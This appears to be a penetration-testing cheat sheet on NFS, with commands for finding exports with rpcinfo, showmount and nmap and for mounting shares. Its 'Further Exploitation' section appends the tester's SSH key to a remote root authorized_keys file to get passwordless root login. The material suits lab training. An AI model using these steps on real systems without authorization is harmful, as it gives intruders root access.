## Quick Intro

- Developed in 1984 by Sun Microsystem and similar to SMB because it allows access to files over a network.
    
- Common ports used by NFS are **port 111 and 2049 tcp/udp**
    
- It is a client/server system that allows users to access files across a network and treat them as if they resided in a local file directory.
    

## Identifying if NFS is in use

```
rpcinfo -p <ip>

# If you get 111 and 2049 listed , shares are enable and we can mount them
```

## Show all mounts

- if nfs is available, use **showmount** to view available mounting points

```
showmount -e $ip
```

## Mount a NFS share

- you can then mount the file system with the **mount** command and interact with remote system
    
- first create the directory for mounting -
    `mkdir /mnt/nfs`

```
mount -t nfs $ip:/share /mnt/nfs
```

## Unmounting the shares

```
umount -f -l /mnt/nfs
# -f – Force unmount (in case of an unreachable NFS system). (Requires kernel 2.1.116 or later.)
# -l – Lazy unmount. Detach the filesystem from the filesystem hierarchy now, and cleanup all references to the filesystem as soon as it is not busy anymore. (Requires kernel 2.4.11 or later.)
```

## Further Exploitation

- **If you can write to the remote hosts, try to put ssh key there** so that we can get remote ssh without password 

```
ssh keygen
# Generating ssh keys

cat ~/.ssh/id_rsa.pub >> /mnt/nfs/root/.ssh/authorized_keys
# Putting it to remote host

ssh root@$ip
# Now can login without password on target
```

## Nmap Scan on RPCbind and NFS

```
nmap -v -p 111 10.11.1.1-254

nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254

nmap -p 111 --script nfs* 10.11.1.72
```
